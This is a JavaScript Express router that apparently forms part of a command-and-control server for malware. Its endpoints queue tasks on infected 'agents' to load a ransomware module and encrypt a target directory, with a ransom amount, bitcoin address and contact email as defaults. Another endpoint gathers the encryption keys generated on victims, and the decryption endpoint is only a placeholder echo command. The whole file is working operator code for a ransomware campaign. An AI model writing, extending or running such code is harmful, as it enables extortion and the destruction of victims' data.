const express = require('express');
const Task = require('../models/Task');
const { verifyToken } = require('./auth');
const router = express.Router();

// Trigger ransomware encryption on an agent
router.post('/encrypt/:agentId', verifyToken, async (req, res) => {
    try {
        const { agentId } = req.params;
        const { target_dir, amount, bitcoin_address, contact_email } = req.body;
        
        const params = {
            target_dir: target_dir || null,
            amount: amount || '0.5',
            bitcoin_address: bitcoin_address || '1RansomwareAddressHere123',
            contact_email: contact_email || 'decrypt@onion.com'
        };
        
        // First, load the ransomware module if not already loaded
        const loadTask = await Task.create({
            agentId,
            type: 'module_load',
            moduleName: 'ransomware'
        });
        
        // Then, trigger encryption
        const encryptTask = await Task.create({
            agentId,
            type: 'module_action',
            moduleName: 'ransomware',
            moduleAction: 'encrypt',
            moduleParams: params
        });
        
        res.json({ 
            message: 'Ransomware encryption triggered',
            loadTaskId: loadTask.taskId,
            encryptTaskId: encryptTask.taskId
        });
    } catch (error) {
        console.error('Ransomware encrypt error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Get ransomware status (check if key was received)
router.get('/status/:agentId', verifyToken, async (req, res) => {
    try {
        const { agentId } = req.params;
        
        // Look for ransomware key results
        const tasks = await Task.findByAgent(agentId);
        const keyTasks = tasks.filter(t => 
            t.type === 'module_action' && 
            t.moduleName === 'ransomware' &&
            t.moduleAction === 'generate_key' &&
            t.status === 'completed'
        );
        
        const keys = keyTasks.map(t => {
            try {
                return JSON.parse(t.result);
            } catch {
                return null;
            }
        }).filter(k => k);
        
        res.json({
            hasKey: keys.length > 0,
            keys: keys,
            encryptionTriggered: tasks.some(t => 
                t.type === 'module_action' && 
                t.moduleName === 'ransomware' && 
                t.moduleAction === 'encrypt'
            )
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Generate decryption key (for recovery)
router.post('/decrypt/:agentId', verifyToken, async (req, res) => {
    try {
        const { agentId } = req.params;
        const { decryption_key } = req.body;
        
        if (!decryption_key) {
            return res.status(400).json({ error: 'decryption_key required' });
        }
        
        // Note: Decryption would require a custom module or command
        // This is a placeholder for future implementation
        const task = await Task.create({
            agentId,
            type: 'command',
            command: `echo "Decryption would require a custom module with key: ${decryption_key.substring(0, 20)}..."`
        });
        
        res.json({ 
            message: 'Decryption command sent (requires custom implementation)',
            taskId: task.taskId
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;